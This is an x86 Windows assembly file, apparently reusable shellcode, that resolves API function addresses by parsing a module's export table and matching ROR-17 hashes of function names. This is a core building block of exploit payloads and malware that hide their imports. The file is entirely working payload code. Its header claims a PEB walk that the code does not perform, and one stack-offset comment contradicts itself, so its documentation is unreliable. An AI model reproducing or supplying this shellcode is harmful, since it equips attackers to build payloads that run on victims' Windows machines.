; find function shellcode - x86 Windows
; Walks PEB to find kernel32.dll base address,
; parses export table to resolve function by ROR17 hash,
; and returns function address in EAX.
section .text

; ecx
find_function:
    pushad                     ; Save all registers
    mov edx, [ebx + 0x3c]      ; EDX = RVA of PE signature (e_lfanew)
    mov edx, [edx + ebx + 0x78]; EDX = RVA of Export Table
    add edx, ebx               ; EDX = VA of Export Table
    mov ecx, [edx + 0x14]      ; ECX = NumberOfNames
    mov eax, [edx + 0x1c]      ; EAX = RVA of AddressOfFunctions (Address Table)
    add eax, ebx               ; EAX = VA of Address Table
    push eax                   ; Save Address Table pointer on stack
    mov edi, [edx + 0x20]      ; EDI = RVA of AddressOfNames (Name Table)
    add edi, ebx               ; EDI = VA of Name Table
    mov edx, [edx + 0x24]      ; EDX = RVA of AddressOfNameOrdinals (Ordinal Table)
    add edx, ebx               ; EDX = VA of Ordinal Table
    push edx                   ; Save Ordinal Table pointer on stack
.ff_loop:
    jecxz .ff_notfound         ; If ECX == 0, function not found
    dec ecx                    ; Decrement counter (index into name table)
    mov esi, [edi + ecx * 4]   ; ESI = RVA of current function name
    add esi, ebx               ; ESI = VA of current function name
    xor eax, eax               ; Clear EAX for lodsb
    xor edx, edx               ; Clear hash accumulator
.ff_hash:
    lodsb                       ; AL = next byte of function name, ESI++
    test al, al                 ; Null terminator?
    jz .ff_compare              ; Yes -> compare computed hash
    ror edx, 0x11               ; Rotate hash right by 17
    add edx, eax                ; Add character to hash
    jmp .ff_hash                ; Next character
.ff_compare:
    ; The target hash is at [ESP + 0x28]:
    ;   ESP+0x00: saved Ordinal Table ptr (from push edx above)
    ;   ESP+0x04: saved Address Table ptr (from push eax above)
    ;   ESP+0x08: pushad (8 regs * 4 = 32 = 0x20 bytes)
    ;   ESP+0x28: return address (from CALL)
    ;   ESP+0x2C: target hash (pushed before CALL)
    cmp edx, [esp + 0x2c]      ; Compare hash with target
    jnz .ff_loop                ; No match -> try next name

    ; Match found!
    pop edx                    ; EDX = Ordinal Table pointer
    pop eax                    ; EAX = Address Table pointer
    mov cx, [edx + ecx * 2]    ; CX = ordinal number for matched name
    mov edx, [eax + ecx * 4]   ; EDX = RVA of function
    add edx, ebx               ; EDX = VA of function (absolute address)
    mov [esp + 0x1c], edx      ; Store result in EAX position within the pushad frame on stack
    popad                      ; Restore all registers
    ret 4                      ; Return, cleaning up the stack (4 bytes for the pushed hash)
.ff_notfound:
    pop edx                    ; Clean up stack
    pop eax
    popad                      ; Restore all registers
    xor eax, eax               ; Return 0 in EAX to indicate failure
    ret 4                      ; Return, cleaning up the stack (4 bytes for the pushed hash)